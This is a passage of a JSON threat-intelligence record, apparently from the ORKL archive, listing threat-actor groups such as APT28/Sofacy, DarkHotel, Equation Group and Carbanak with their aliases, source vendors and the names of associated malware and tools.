        {
            "id": "efe6ff9a-822d-41a6-90c3-45265cac696b",
            "created_at": "2024-05-01T02:03:07.920302Z",
            "updated_at": "2025-03-27T02:05:17.246342Z",
            "deleted_at": null,
            "main_name": "ALUMINUM SARATOGA",
            "aliases": [
                "Arid Viper",
                "Desert Falcon",
                "Extreme Jackal ",
                "Gaza CyberGang",
                "Gaza CyberGang",
                "Molerats ",
                "Operation DustySky ",
                "TA402",
                "APT-C-23"
            ],
            "source_name": "Secureworks:ALUMINUM SARATOGA",
            "tools": [
                " BrittleBush",
                " DarkComet",
                " LastConn",
                " Micropsia",
                " NimbleMamba",
                " PoisonIvy",
                " QuasarRAT",
                " XtremeRat",
                "BlackShades"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1876bdf9-2d7c-482c-85d4-df77aef4a8a9",
            "created_at": "2023-01-06T13:46:39.092404Z",
            "updated_at": "2025-03-27T02:00:02.994689Z",
            "deleted_at": null,
            "main_name": "APT-C-12",
            "aliases": [
                "Sapphire Mushroom",
                "Blue Mushroom",
                "NuclearCrisis"
            ],
            "source_name": "MISPGALAXY:APT-C-12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "929d794b-0e1d-4d10-93a6-29408a527cc2",
            "created_at": "2023-01-06T13:46:38.70844Z",
            "updated_at": "2025-03-27T02:00:02.897573Z",
            "deleted_at": null,
            "main_name": "AridViper",
            "aliases": [
                "Arid Viper",
                "APT-C-23",
                "Bearded Barbie",
                "Desert Falcon"
            ],
            "source_name": "MISPGALAXY:AridViper",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041817,
    "ts_creation_date": 1453198783,
    "ts_modification_date": 1453198783,
    "files": {
        "pdf": "https://archive.orkl.eu/1daa7fd401a37b65528f168a9818289fb214d1d1.pdf",
        "text": "https://archive.orkl.eu/1daa7fd401a37b65528f168a9818289fb214d1d1.txt",
        "img": "https://archive.orkl.eu/1daa7fd401a37b65528f168a9818289fb214d1d1.jpg"
    }
}